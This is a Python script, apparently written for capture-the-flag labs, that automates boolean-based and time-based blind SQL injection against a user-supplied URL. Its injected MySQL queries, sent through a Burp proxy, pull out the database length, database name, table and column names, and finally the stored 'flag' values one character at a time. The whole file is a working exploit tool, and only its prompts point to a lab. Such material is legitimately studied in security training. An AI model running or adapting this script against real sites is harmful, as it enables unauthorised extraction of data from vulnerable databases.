import requests
import urllib3
from colorama import Fore, Style, init
import time

# Initialize colorama for colored terminal output
init(autoreset=True)

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure proxy for Burp Suite
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

def banner():
    print(Fore.RED + """
:::'###:::::'######:::::'###::::'########::'####:::::::::::'######:::'#######::'##:::::::'####:
::'## ##:::'##... ##:::'## ##::: ##.... ##:. ##:::::::::::'##... ##:'##.... ##: ##:::::::. ##::
:'##:. ##:: ##:::..:::'##:. ##:: ##:::: ##:: ##::::::::::: ##:::..:: ##:::: ##: ##:::::::: ##::
'##:::. ##:. ######::'##:::. ##: ##:::: ##:: ##:::::::::::. ######:: ##:::: ##: ##:::::::: ##::
 #########::..... ##: #########: ##:::: ##:: ##::::::::::::..... ##: ##:'## ##: ##:::::::: ##::
 ##.... ##:'##::: ##: ##.... ##: ##:::: ##:: ##:::::::::::'##::: ##: ##:.. ##:: ##:::::::: ##::
 ##:::: ##:. ######:: ##:::: ##: ########::'####::::::::::. ######::: ##### ##: ########:'####:
..:::::..:::......:::..:::::..::........:::....::::::::::::......::::.....:..::........::....::
""")

def boolean_based_injection(url, query):
    response = requests.get(url + query, proxies=proxies, verify=False)
    if "1" in response.text:
        return True
    return False

def time_based_injection(url, query, delay=2):
    start_time = time.time()
    response = requests.get(url + query, proxies=proxies, verify=False)
    end_time = time.time()
    if end_time - start_time > delay:
        return True
    return False

def get_database_length(url, attack_type):
    query_boolean = "?id=1' AND IF(LENGTH(DATABASE()) > {}, 1, 0)%23"
    query_time = "?id=1' AND IF(LENGTH(DATABASE()) > {}, SLEEP(5), 0)%23"
    db_length = 0
    for i in range(30):
        if attack_type == "1":
            if boolean_based_injection(url, query_boolean.format(i)):
                db_length += 1
        elif attack_type == "2":
            if time_based_injection(url, query_time.format(i)):
                db_length += 1
        else:
            print(Fore.RED + "Invalid attack type!")
            return
    print(Fore.GREEN + f'[+] Database Length Found: {db_length}')
    return db_length

def get_database_name(url, db_length, attack_type):
    query_boolean = "?id=1' AND IF((SUBSTRING((SELECT DATABASE()), {}, 1) = '{}'), 1, 0)%23"
    query_time = "?id=1' AND IF((SUBSTRING((SELECT DATABASE()), {}, 1) = '{}'), SLEEP(5), 0)%23"
    characters = 'abcdefghijklmnopqrstuvwxyz0123456789-_'
    database_name = ""
    for position in range(1, db_length + 1):
        for char in characters:
            if attack_type == "1":
                if boolean_based_injection(url, query_boolean.format(position, char)):
                    database_name += char
                    print(Fore.YELLOW + f"[+] Character found: {char} at position {position}")
                    break
            elif attack_type == "2":
                if time_based_injection(url, query_time.format(position, char)):
                    database_name += char
                    print(Fore.YELLOW + f"[+] Character found: {char} at position {position}")
                    break
    print(Fore.MAGENTA + f"Database Name: {database_name}")
    return database_name

def get_table_name(url, database_name, attack_type):
    query_boolean = "?id=1' AND IF((SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = '{}' LIMIT 1), {}, 1) = '{}'), 1, 0)%23"
    query_time = "?id=1' AND IF((SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = '{}' LIMIT 1), {}, 1) = '{}'), SLEEP(5), 0)%23"
    characters = 'abcdefghijklmnopqrstuvwxyz0123456789-_'
    table_name = ""
    for position in range(1, 30):
        for char in characters:
            if attack_type == "1":
                if boolean_based_injection(url, query_boolean.format(database_name, position, char)):
                    table_name += char
                    print(Fore.YELLOW + f"[+] Character found: {char} at position {position}")
                    break
            elif attack_type == "2":
                if time_based_injection(url, query_time.format(database_name, position, char)):
                    table_name += char
                    print(Fore.YELLOW + f"[+] Character found: {char} at position {position}")
                    break
    print(Fore.MAGENTA + f"Table Name: {table_name}")
    return table_name

def get_column_name(url, table_name, attack_type):
    query_boolean = "?id=1' AND IF((SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = '{}' LIMIT 1 OFFSET 1), {}, 1) = '{}'), 1, 0)%23"
    query_time = "?id=1' AND IF((SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = '{}' LIMIT 1 OFFSET 1), {}, 1) = '{}'), SLEEP(5), 0)%23"
    characters = 'abcdefghijklmnopqrstuvwxyz0123456789-_'
    column_name = ""
    for position in range(1, 30):
        for char in characters:
            if attack_type == "1":
                if boolean_based_injection(url, query_boolean.format(table_name, position, char)):
                    column_name += char
                    print(Fore.YELLOW + f"[+] Character found: {char} at position {position}")
                    break
            elif attack_type == "2":
                if time_based_injection(url, query_time.format(table_name, position, char)):
                    column_name += char
                    print(Fore.YELLOW + f"[+] Character found: {char} at position {position}")
                    break
    print(Fore.MAGENTA + f"Column Name: {column_name}")
    return column_name

def get_flag(url, table_name, column_name, attack_type):
    query_boolean = "?id=1' AND IF((SUBSTRING((SELECT {} FROM {}), {}, 1) = '{}'), 1, 0)%23"
    query_time = "?id=1' AND IF((SUBSTRING((SELECT {} FROM {}), {}, 1) = '{}'), SLEEP(5), 0)%23"
    characters = 'abcdefghijklmnopqrstuvwxyz0123456789-_'
    flag = ""
    for position in range(1, 50):
        for char in characters:
            if attack_type == "1":
                if boolean_based_injection(url, query_boolean.format(column_name, table_name, position, char)):
                    flag += char
                    print(Fore.YELLOW + f"[+] Character found: {char} at position {position}")
                    break
            elif attack_type == "2":
                if time_based_injection(url, query_time.format(column_name, table_name, position, char)):
                    flag += char
                    print(Fore.YELLOW + f"[+] Character found: {char} at position {position}")
                    break
    print(Fore.RED + f"Flag Found: {flag}")
    return flag

def main():
    banner()
    url = input(Fore.CYAN + 'Please Enter Your Lab Link: ')
    
    print("\nChoose attack type:")
    print("1. Boolean-Based Blind SQL Injection")
    print("2. Time-Based Blind SQL Injection")
    attack_type = input(Fore.CYAN + "\nEnter choice: ")

    print("\nChoose an action:")
    print("1. Get Database Length")
    print("2. Get Database Name")
    print("3. Get Table Name")
    print("4. Get Column Name")
    print("5. Get Flag")
    choice = input(Fore.CYAN + "\nEnter choice: ")
    
    if choice == "1":
        get_database_length(url, attack_type)
    elif choice == "2":
        db_length = get_database_length(url, attack_type)
        get_database_name(url, db_length, attack_type)
    elif choice == "3":
        db_length = get_database_length(url, attack_type)
        database_name = get_database_name(url, db_length, attack_type)
        get_table_name(url, database_name, attack_type)
    elif choice == "4":
        db_length = get_database_length(url, attack_type)
        database_name = get_database_name(url, db_length, attack_type)
        table_name = get_table_name(url, database_name, attack_type)
        get_column_name(url, table_name, attack_type)
    elif choice == "5":
        db_length = get_database_length(url, attack_type)
        database_name = get_database_name(url, db_length, attack_type)
        table_name = get_table_name(url, database_name, attack_type)
        column_name = get_column_name(url, table_name, attack_type)
        get_flag(url, table_name, column_name, attack_type)
    else:
        print(Fore.RED + "Invalid choice!")

if __name__ == "__main__":
    main()
